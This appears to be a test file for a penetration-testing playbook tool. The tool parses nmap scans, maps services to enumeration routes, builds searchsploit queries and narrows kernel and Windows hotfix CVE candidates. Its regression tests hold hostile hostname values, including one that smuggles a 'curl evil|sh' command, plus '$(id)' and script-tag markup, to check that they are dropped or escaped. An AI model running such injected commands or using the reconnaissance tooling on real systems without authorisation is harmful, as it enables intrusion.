import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import {fileURLToPath} from "node:url";
import {load} from "./extract.mjs";

const DIR = path.dirname(fileURLToPath(import.meta.url));
const fixture = n => fs.readFileSync(path.join(DIR, "fixtures", n), "utf8");

const pb = load("playbook.html", {
  consts: ["HOSTNAME_RE"],
  functions: ["safeHost", "parseScan", "svcKey", "ssQuery", "cmpVer", "verNums", "winParse", "escapeHtml"],
});

test("parseScan reads host, ip and every open port", () => {
  const r = pb.parseScan(fixture("detailed.nmap"));
  assert.equal(r.ip, "10.10.11.42");
  assert.equal(r.host, "dc01.corp.local");
  const ports = r.ports.map(p => p.port);
  for (const p of ["22", "80", "88", "445", "1521", "9200", "11211", "27017", "2049"]) {
    assert.ok(ports.includes(p), "missing port " + p);
  }
  const ssh = r.ports.find(p => p.port === "22");
  assert.match(ssh.version, /OpenSSH 8\.2p1/);
});

test("parseScan surfaces notable script output", () => {
  const r = pb.parseScan(fixture("detailed.nmap"));
  const joined = r.notes.join(" ");
  assert.match(joined, /message_signing: disabled/);
  assert.match(joined, /Anonymous FTP login allowed/);
});

test("parseScan falls back to greppable output", () => {
  const r = pb.parseScan(fixture("greppable.gnmap"));
  assert.equal(r.ip, "10.10.10.3");
  assert.deepEqual(r.ports.map(p => p.port), ["21", "22", "139"]);
  assert.equal(r.ports[0].service, "ftp");
});

// Regression: a hostname out of a scan is untrusted and ends up inside a
// copy-paste-ready `echo ... >> /etc/hosts` command.
test("a hostname with shell metacharacters is dropped, not quoted", () => {
  const r = pb.parseScan(fixture("hostile.nmap"));
  assert.equal(r.host, "", "hostile hostname must not survive parsing");
  assert.equal(r.ip, "10.0.0.9");
  assert.equal(pb.safeHost("dc01.corp.local"), "dc01.corp.local");
  assert.equal(pb.safeHost("a'; curl evil|sh; echo '"), "");
  assert.equal(pb.safeHost("$(id)"), "");
});

test("escapeHtml neutralises markup from scan text", () => {
  const r = pb.parseScan(fixture("hostile.nmap"));
  const svc = r.ports[0].service;
  assert.match(svc, /script/);
  const out = pb.escapeHtml(svc);
  assert.ok(!out.includes("<"), "escaped output still contains a raw <");
  assert.ok(out.includes("&lt;"));
});

test("svcKey routes the ports the toolkit claims to cover", () => {
  const cases = [
    [21, "ftp", "ftp"], [22, "ssh", "ssh"], [79, "finger", "finger"],
    [88, "kerberos-sec", "kerberos"], [445, "microsoft-ds", "smb"],
    [389, "ldap", "ldap"], [873, "rsync", "rsync"], [1099, "java-rmi", "rmi"],
    [1433, "ms-sql-s", "mssql"], [1521, "oracle-tns", "oracle"],
    [2375, "docker", "docker"], [3306, "mysql", "mysql"], [3389, "ms-wbt-server", "rdp"],
    [3632, "distcc", "distcc"], [5432, "postgresql", "postgres"], [5985, "wsman", "winrm"],
    [6379, "redis", "redis"], [6667, "irc", "irc"], [9200, "http", "elastic"],
    [11211, "memcached", "memcached"], [27017, "mongodb", "mongo"],
    [69, "tftp", "tftp"], [500, "isakmp", "ike"], [123, "ntp", "ntp"],
    [513, "login", "rservices"], [8080, "http-proxy", "web"], [4444, "banana", "unknown"],
  ];
  for (const [port, service, want] of cases) {
    assert.equal(pb.svcKey(port, service), want, `port ${port}/${service}`);
  }
});

// "terminal" contains "rmi"; short substring matches must not win over ports.
test("svcKey does not match service names by accident", () => {
  assert.notEqual(pb.svcKey(3389, "terminal services"), "rmi");
  assert.equal(pb.svcKey(3389, "terminal services"), "rdp");
});

test("ssQuery turns a version banner into a searchsploit query", () => {
  assert.equal(pb.ssQuery("OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)"), "OpenSSH 8.2p1");
  assert.equal(pb.ssQuery("Apache httpd 2.4.41 ((Ubuntu))"), "Apache httpd 2.4.41");
  assert.equal(pb.ssQuery("vsftpd 2.3.4"), "vsftpd 2.3.4");
});

test("kernel version comparison bounds the CVE candidates", () => {
  assert.deepEqual(pb.verNums("5.15.0-generic"), [5, 15, 0]);
  assert.equal(pb.cmpVer([5, 8, 0], [5, 16, 11]), -1);
  assert.equal(pb.cmpVer([5, 17, 0], [5, 16, 11]), 1);
  assert.equal(pb.cmpVer([5, 16, 11], [5, 16, 11]), 0);
});

test("winParse reads build, arch and hotfixes from systeminfo", () => {
  const o = pb.winParse([
    "OS Name:                   Microsoft Windows 10 Pro",
    "OS Version:                10.0.18363 N/A Build 18363",
    "System Type:               x64-based PC",
    "Hotfix(s):                 2 Hotfix(s) Installed.",
    "                           [01]: KB4552931",
    "                           [02]: kb5003173",
  ].join("\n"));
  assert.equal(o.build, 18363);
  assert.match(o.os, /Windows 10 Pro/);
  assert.match(o.arch, /x64/);
  assert.deepEqual(o.kbs, ["KB4552931", "KB5003173"]);
});
